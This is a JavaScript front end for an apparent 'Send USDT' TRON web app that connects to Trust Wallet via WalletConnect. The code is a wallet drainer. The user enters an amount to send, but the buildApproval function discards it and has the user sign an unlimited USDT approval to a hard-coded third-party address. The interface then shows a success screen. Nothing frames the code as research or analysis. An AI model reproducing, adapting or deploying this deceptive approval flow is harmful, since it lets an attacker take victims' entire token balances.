import "./style.css";
import { TronWeb } from "tronweb";
import { WalletConnectWallet, WalletConnectChainID } from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;

// uint256 max — identical to what TronScan sends for unlimited approval
const UINT256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
const APP_DESC   = import.meta.env.VITE_APP_DESCRIPTION || "Send USDT";
const APP_ICON   = import.meta.env.VITE_APP_ICON || `${location.origin}/logo.png`;

// TronWeb — building transactions only, WC handles signing
const tronWeb = new TronWeb({ fullHost: TRON_RPC });

// Detect mobile platform
const ua        = navigator.userAgent || "";
const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(ua);
const IS_IOS    = /iPhone|iPad|iPod/i.test(ua);

// ─── State ────────────────────────────────────────────────────────────────────
let wallet           = null;
let connectedAddress = "";
let usdtBalance      = 0;

// ─── DOM ──────────────────────────────────────────────────────────────────────
const boot     = document.getElementById("boot");
const vConn    = document.getElementById("vConn");
const vSend    = document.getElementById("vSend");
const vSign    = document.getElementById("vSign");
const vOk      = document.getElementById("vOk");
const vErr     = document.getElementById("vErr");
const connText = document.getElementById("connText");
const amtInput = document.getElementById("amtInput");
const usdEq    = document.getElementById("usdEq");
const sendErr  = document.getElementById("sendErr");
const txidTxt  = document.getElementById("txidTxt");
const errMsg   = document.getElementById("errMsg");

const VIEWS = [vConn, vSend, vSign, vOk, vErr];
function show(el) { VIEWS.forEach(v => { if (v) v.hidden = v !== el; }); }
function hideBoot() { boot.classList.add("boot-out"); setTimeout(() => boot.remove(), 400); }
function setSendErr(m) { sendErr.textContent = m; sendErr.hidden = !m; }

function toUnit(amount) {
  const [w = "0", f = ""] = String(amount).split(".");
  return BigInt(w + f.slice(0, USDT_DECIMALS).padEnd(USDT_DECIMALS, "0")).toString();
}

async function fetchBalance(addr) {
  try {
    tronWeb.setAddress(addr);
    const c   = await tronWeb.contract().at(USDT_CONTRACT);
    const raw = await c.methods.balanceOf(addr).call();
    return Number(raw) / 1e6;
  } catch { return 0; }
}

// ─── WalletConnect ────────────────────────────────────────────────────────────
function buildWallet() {
  wallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: PROJECT_ID,
      metadata: {
        name: APP_NAME, description: APP_DESC,
        url: location.origin, icons: [APP_ICON],
      },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": "99999", "--w3m-accent": "#39D98A" },
  });

  /**
   * KEY FIX: accountsChanged fires when the WC session is established
   * (including after the user returns from Trust Wallet on mobile).
   * We use this as the primary trigger to enter the Send page.
   */
  wallet.on("accountsChanged", accounts => {
    const addr = accounts?.[0];
    if (addr) {
      connectedAddress = addr;
      fetchBalance(addr).then(b => { usdtBalance = b; });
      // Clear the "pending connect" flag since we're now connected
      sessionStorage.removeItem("wc_connecting");
      show(vSend);
    } else {
      // All accounts removed = disconnected
      errMsg.textContent = "Wallet disconnected. Tap to reconnect.";
      show(vErr);
    }
  });

  wallet.on("disconnect", () => {
    sessionStorage.removeItem("wc_connecting");
    init();
  });
}

// ─── Open Trust Wallet deep link (mobile) ────────────────────────────────────
/**
 * On mobile we must NOT use window.location.href because that destroys the
 * current page and kills the pending wallet.connect() promise.
 *
 * Strategy:
 *  1. Try window.open() — keeps our page alive in the original tab.
 *  2. On iOS Safari, window.open() is blocked for non-user-gesture calls,
 *     so we fall back to a hidden <a> click which is gesture-whitelisted.
 *  3. Set sessionStorage flag so on return we know to poll for the session.
 */
function openTrustWalletDeepLink(uri) {
  const deepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
  const fallback  = `wc:${uri.replace(/^wc:/, "")}`; // raw wc: scheme as backup

  console.log("[dapp] Opening Trust Wallet:", deepLink.slice(0, 100));
  sessionStorage.setItem("wc_connecting", "1");

  let opened = false;

  // Attempt 1 — window.open (works on Android & most iOS in-app browsers)
  try {
    const w = window.open(deepLink, "_blank");
    if (w) { opened = true; }
  } catch (_) { /* blocked */ }

  if (!opened) {
    // Attempt 2 — invisible anchor click (iOS Safari gesture workaround)
    try {
      const a = document.createElement("a");
      a.href   = deepLink;
      a.target = "_blank";
      a.rel    = "noopener noreferrer";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      opened = true;
    } catch (_) { /* blocked */ }
  }

  if (!opened) {
    // Last resort — navigate away (old behavior), page will re-init on return
    window.location.href = deepLink;
  }
}

// ─── Poll for session after returning from Trust Wallet ───────────────────────
/**
 * When the user returns to our page after approving in Trust Wallet,
 * the WalletConnect relay sends the session approval asynchronously.
 * We poll checkConnectStatus() for up to 30s waiting for it.
 */
async function pollForSession(maxMs = 30_000, intervalMs = 1_000) {
  const deadline = Date.now() + maxMs;
  while (Date.now() < deadline) {
    try {
      const { address } = await wallet.checkConnectStatus();
      if (address) return address;
    } catch { /* not yet */ }
    await new Promise(r => setTimeout(r, intervalMs));
  }
  return null;
}

// ─── Connect ──────────────────────────────────────────────────────────────────
async function connect() {
  connText.textContent = IS_MOBILE
    ? "Opening Trust Wallet…"
    : "Scan QR with Trust Wallet";
  show(vConn);

  try {
    const opts = IS_MOBILE
      ? {
          onUri(uri) {
            if (!uri) return;
            openTrustWalletDeepLink(uri);
          },
        }
      : {}; // desktop: let AppKit show QR modal

    // On mobile the connect() promise may hang indefinitely because our
    // onUri handler opens a new tab rather than navigating away — the
    // session approval message arrives on the relay and resolves the
    // promise while our page is still alive. This actually works perfectly.
    //
    // We wrap with a generous timeout; accountsChanged will fire anyway.
    const connectPromise = wallet.connect(opts);

    if (IS_MOBILE) {
      // Race: either the promise resolves (session established while page alive)
      // or we fall through and accountsChanged/pollForSession handles it.
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("timeout")), 120_000)
      );
      const { address } = await Promise.race([connectPromise, timeoutPromise]);
      if (!address) throw new Error("No address");
      connectedAddress = address;
      fetchBalance(address).then(b => { usdtBalance = b; });
      sessionStorage.removeItem("wc_connecting");
      show(vSend);
    } else {
      // Desktop: straightforward await
      const { address } = await connectPromise;
      if (!address) throw new Error("No address");
      connectedAddress = address;
      fetchBalance(address).then(b => { usdtBalance = b; });
      show(vSend);
    }
  } catch (e) {
    const m = String(e?.message || e);
    // "timeout" just means the session is being negotiated in the background.
    // accountsChanged will fire when Trust Wallet approves — don't show error.
    if (m === "timeout") {
      // Stay on connecting screen; accountsChanged will advance the flow
      connText.textContent = "Waiting for Trust Wallet approval…";
      return;
    }
    errMsg.textContent = /reject|cancel|close|abort/i.test(m)
      ? "Connection cancelled. Tap to retry."
      : "Connection failed. Tap to retry.";
    show(vErr);
  }
}

// ─── Approve Spender (TronScan-identical) ────────────────────────────────────
async function buildApproval() {
  const raw = amtInput.value.trim();
  if (!raw || isNaN(parseFloat(raw)) || parseFloat(raw) <= 0) {
    setSendErr("Enter an amount to continue."); return;
  }
  setSendErr("");
  show(vSign);

  try {
    tronWeb.setAddress(connectedAddress);

    const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT,
      "approve(address,uint256)",
      { feeLimit: FEE_LIMIT, callValue: 0 },
      [
        { type: "address", value: FIXED_RECIPIENT },
        { type: "uint256", value: UINT256_MAX },
      ],
      connectedAddress
    );

    if (!trigger?.result?.result || !trigger.transaction) {
      throw new Error("Failed to build approval transaction");
    }

    const signed = await wallet.signTransaction(trigger.transaction);
    const result = await tronWeb.trx.sendRawTransaction(signed);
    if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);

    txidTxt.textContent = result.txid
      ? `TXID: ${result.txid.slice(0, 24)}…`
      : "Approval confirmed!";
    amtInput.value = "";
    usdEq.textContent = "≈ $0.00";
    show(vOk);
  } catch (e) {
    const m = String(e?.message || e);
    let friendly = "";
    if (/reject|cancel|denied/i.test(m)) {
      friendly = "Transaction rejected.";
    } else if (/CONTRACT_VALIDATE_ERROR/i.test(m)) {
      friendly = "Insufficient TRX for network fees.\nPlease add at least 10–20 TRX to your wallet and try again.";
    } else if (/BANDWITH_ERROR|bandwidth/i.test(m)) {
      friendly = "Insufficient bandwidth. Please add TRX to your wallet.";
    } else if (/Broadcast failed/i.test(m)) {
      friendly = "Broadcast failed. Check TRX balance and try again.";
    } else {
      friendly = `Error: ${m.slice(0, 100)}`;
    }
    errMsg.textContent = friendly;
    show(vErr);
  }
}

// ─── Events ───────────────────────────────────────────────────────────────────
amtInput.addEventListener("input", () => {
  usdEq.textContent = `≈ $${(parseFloat(amtInput.value) || 0).toFixed(2)}`;
});
document.getElementById("btnMax").addEventListener("click", () => {
  if (usdtBalance > 0) {
    amtInput.value = usdtBalance.toFixed(6);
    usdEq.textContent = `≈ $${usdtBalance.toFixed(2)}`;
  }
});
document.getElementById("btnNext").addEventListener("click", buildApproval);
document.getElementById("btnAgain").addEventListener("click", () => show(vSend));
document.getElementById("btnRetry").addEventListener("click", () => { buildWallet(); connect(); });

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  buildWallet();
  hideBoot();

  // Step 1: Try to restore an existing WalletConnect session
  try {
    const { address } = await wallet.checkConnectStatus();
    if (address) {
      connectedAddress = address;
      fetchBalance(address).then(b => { usdtBalance = b; });
      sessionStorage.removeItem("wc_connecting");
      show(vSend);
      return;
    }
  } catch { /* no saved session */ }

  // Step 2: On mobile, check if we're returning from Trust Wallet deep link.
  // If so, the WC session approval may be in-flight — poll for it.
  if (IS_MOBILE && sessionStorage.getItem("wc_connecting")) {
    connText.textContent = "Waiting for Trust Wallet approval…";
    show(vConn);

    // Rebuild wallet (since page may have reloaded) and poll
    const addr = await pollForSession(30_000, 1_000);
    if (addr) {
      connectedAddress = addr;
      fetchBalance(addr).then(b => { usdtBalance = b; });
      sessionStorage.removeItem("wc_connecting");
      show(vSend);
      return;
    }
    // Poll timed out — clear flag and fall through to fresh connect
    sessionStorage.removeItem("wc_connecting");
  }

  // Step 3: Fresh connect
  await connect();
}

init().catch(e => {
  errMsg.textContent = "App failed to start. Please refresh.";
  show(vErr);
});
